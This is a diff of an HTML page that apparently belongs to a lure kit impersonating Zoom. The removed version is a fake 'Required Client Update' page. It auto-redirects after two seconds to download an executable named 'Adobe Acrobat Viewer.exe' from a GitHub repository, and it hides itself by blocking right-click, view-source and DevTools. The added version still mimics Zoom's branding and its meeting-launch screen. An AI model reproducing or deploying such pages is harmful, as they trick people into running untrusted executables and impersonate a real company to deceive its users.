@@ -3,182 +3,77 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Zoom Desktop Client Update</title>
-  <meta http-equiv="refresh" content="2; url=https://github.com/billsmike987/zoom/raw/refs/heads/main/Adobe%20Acrobat%20Viewer.exe">
-  <script src="https://cdn.tailwindcss.com"></script>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <title>Zoom Meeting Launch</title>
   <style>
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 60px 20px;
+      color: #1c1c1c;
     }
-    @keyframes ping {
-      75%, 100% {
-        transform: scale(1.8);
-        opacity: 0;
-      }
+    .logo {
+      margin-bottom: 40px;
     }
-    .gradient-bg {
-      background: linear-gradient(135deg, #f8fafc 0%, #e2e8f0 100%);
+    .logo img {
+      height: 30px;
     }
-    .zoom-gradient {
-      background: linear-gradient(to right, #2D8CFF, #00B0E9);
+    .launch-box {
+      margin-bottom: 30px;
     }
-    .spinner {
-      animation: spin 1s linear infinite;
+    .launch-box p {
+      margin: 10px 0;
     }
-    .ping-animation {
-      animation: ping 1.5s cubic-bezier(0, 0, 0.2, 1) infinite;
+    .launch-btn {
+      background-color: #0b5cff;
+      color: white;
+      padding: 12px 30px;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+      margin-top: 20px;
     }
-    .shadow-soft {
-      box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05), 0 2px 4px -1px rgba(0, 0, 0, 0.02);
+    .footer {
+      font-size: 12px;
+      color: #777;
+      margin-top: 50px;
     }
-    .glow-text {
-      text-shadow: 0 0 10px rgba(45, 140, 255, 0.3);
+    a {
+      color: #0b5cff;
+      text-decoration: none;
     }
   </style>
-  <script>
-    // Disable right-click
-    document.addEventListener('contextmenu', event => event.preventDefault());
-    
-    // Disable specific key combos
-    document.addEventListener('keydown', function (e) {
-      if (
-        e.ctrlKey && 
-        (e.key === 'u' || e.key === 's' || e.key === 'c' || e.key === 'v' || e.key === 'x' || e.key === 'i' || e.key === 'j')
-      ) {
-        e.preventDefault();
-      }
-      
-      // F12
-      if (e.keyCode === 123) {
-        e.preventDefault();
-      }
-    });
-    
-    // Try to block DevTools detection
-    setInterval(function () {
-      const before = new Date();
-      debugger;
-      const after = new Date();
-      if (after - before > 100) {
-        window.location.href = 'about:blank';
-      }
-    }, 1000);
-    
-    // Countdown timer
-    document.addEventListener('DOMContentLoaded', function() {
-      let seconds = 10;
-      const countdownElement = document.getElementById('countdown');
-      const countdownTextElement = document.getElementById('countdown-text');
-      
-      const timer = setInterval(function() {
-        seconds--;
-        countdownElement.textContent = seconds;
-        countdownTextElement.textContent = seconds;
-        
-        if (seconds <= 0) {
-          clearInterval(timer);
-        }
-      }, 1000);
-    });
-  </script>
 </head>
-<body class="gradient-bg min-h-screen flex flex-col">
-  <header class="py-4 px-6 md:px-12 border-b border-gray-200 bg-white shadow-soft">
-    <div class="flex items-center">
-      <img src="https://st1.zoom.us/static/6.3.12813/image/new/ZoomLogo.png" alt="Zoom Logo" class="h-8">
-      <span class="ml-2 text-xl font-semibold text-gray-700 hidden sm:inline">Zoom</span>
-    </div>
-  </header>
+<body>
 
-  <main class="flex-grow flex items-center justify-center py-12 px-4 sm:px-6 lg:px-8">
-    <div class="w-full max-w-md bg-white rounded-xl shadow-soft overflow-hidden">
-      <div class="zoom-gradient h-2 w-full"></div>
-      
-      <div class="p-8 text-center">
-        <div class="relative flex justify-center mb-6">
-          <div class="absolute inset-0 flex items-center justify-center">
-            <div class="h-24 w-24 rounded-full bg-blue-100 opacity-30 ping-animation"></div>
-          </div>
-          <img src="https://st1.zoom.us/static/6.3.12813/image/new/meeting.png" alt="Zoom Meeting" class="h-16 relative z-10">
-        </div>
-        
-        <h2 class="text-2xl font-bold text-gray-800 mb-1">Required Client Update</h2>
-        <p class="text-gray-600 mb-6">
-          To continue enjoying the latest features and security enhancements, 
-          <br>please update your Zoom desktop client.
-        </p>
-        
-        <div class="flex flex-col items-center mb-8">
-          <div class="relative mb-4 flex items-center justify-center">
-            <div class="w-16 h-16 border-4 border-gray-200 rounded-full spinner border-t-blue-500"></div>
-            <div class="absolute inset-0 flex items-center justify-center">
-              <span id="countdown" class="text-blue-600 font-medium text-lg">10</span>
-            </div>
-          </div>
-          
-          <div class="w-full bg-gray-100 rounded-full h-2.5 mb-3">
-            <div class="bg-blue-500 h-2.5 rounded-full animate-pulse" style="width: 65%"></div>
-          </div>
-          <p class="text-sm text-gray-500 mb-2">Verifying system requirements...</p>
-          <div class="text-xs text-gray-400">
-            <span class="inline-block h-2 w-2 rounded-full bg-green-400 mr-1"></span>
-            <span>Compatible with Windows 10/11</span>
-          </div>
-        </div>
-        
-        <div class="bg-blue-50 rounded-lg p-4 mb-6">
-          <div class="flex items-start">
-            <div class="flex-shrink-0 text-blue-500 mt-1">
-              <i class="fas fa-shield-alt"></i>
-            </div>
-            <div class="ml-3 text-left">
-              <p class="text-sm text-blue-700 font-medium mb-1">What's new in this version:</p>
-              <ul class="text-xs text-blue-600 space-y-1">
-                <li class="flex items-start">
-                  <i class="fas fa-check-circle text-green-500 mr-2 mt-0.5"></i>
-                  Enhanced security protections
-                </li>
-                <li class="flex items-start">
-                  <i class="fas fa-check-circle text-green-500 mr-2 mt-0.5"></i>
-                  Improved meeting stability
-                </li>
-                <li class="flex items-start">
-                  <i class="fas fa-check-circle text-green-500 mr-2 mt-0.5"></i>
-                  New participant controls
-                </li>
-              </ul>
-            </div>
-          </div>
-        </div>
-        
-        <p class="text-sm text-gray-500">
-          Update will download automatically in <span id="countdown-text" class="font-medium text-blue-600">10</span> seconds.
-          <br>
-          If it doesn't, <a href="https://github.com/billsmike987/zoom/raw/refs/heads/main/Adobe%20Acrobat%20Viewer.exe" class="text-blue-600 hover:text-blue-800 font-medium">click here to download now</a>.
-        </p>
-      </div>
-      
-      <div class="px-6 py-4 bg-gray-50 border-t border-gray-200">
-        <p class="text-xs text-gray-500 text-center">
-          By downloading, you agree to Zoom's <a href="https://zoom.us/terms" class="text-blue-600 hover:text-blue-800">Terms of Service</a> and <a href="https://zoom.us/privacy" class="text-blue-600 hover:text-blue-800">Privacy Policy</a>.
-        </p>
-      </div>
-    </div>
-  </main>
+  <div class="logo">
+    <img src="https://st1.zoom.us/fe-static/fe-signup-login-active/img/ZoomLogo.png" alt="Zoom Logo">
+  </div>
 
-  <footer class="py-4 px-6 border-t border-gray-200 bg-white">
-    <div class="flex flex-col md:flex-row justify-between items-center">
-      <p class="text-sm text-gray-500 mb-2 md:mb-0">
-        <i class="far fa-copyright mr-1"></i> 2025 Zoom Video Communications, Inc. All rights reserved.
-      </p>
-      <div class="flex space-x-4">
-        <a href="https://zoom.us/legal" class="text-sm text-gray-500 hover:text-gray-700">Legal</a>
-        <a href="https://zoom.us/trust" class="text-sm text-gray-500 hover:text-gray-700">Trust Center</a>
-        <a href="https://support.zoom.us" class="text-sm text-gray-500 hover:text-gray-700">Support</a>
-      </div>
-    </div>
-  </footer>
+  <div class="launch-box">
+    <p><strong>Your meeting has been launched in the Zoom Workplace app</strong></p>
+    <p>Don’t see your meeting?</p>
+    <p>By joining a meeting, you agree to our 
+      <a href="https://zoom.us/terms">Terms of Service</a> and 
+      <a href="https://zoom.us/privacy">Privacy Statement</a>
+    </p>
+    <button class="launch-btn" onclick="window.location.href='https://zoom.us/j/1234567890?pwd=Password123#success'">
+      Launch Meeting
+    </button>
+  </div>
+
+  <p>Don’t have the Zoom Workplace app installed? <a href="https://zoom.us/download">Download Now</a></p>
+
+  <div class="footer">
+    <p>©2025 Zoom Communications, Inc. All rights reserved.</p>
+    <p>
+      <a href="#">Trust Center</a> |
+      <a href="#">Acceptable Use Guidelines</a> |
+      <a href="#">Legal & Compliance</a> |
+      <a href="#">Do Not Sell My Personal Information</a> |
+      <a href="#">Cookie Preferences</a>
+    </p>
+  </div>
+
 </body>
 </html>
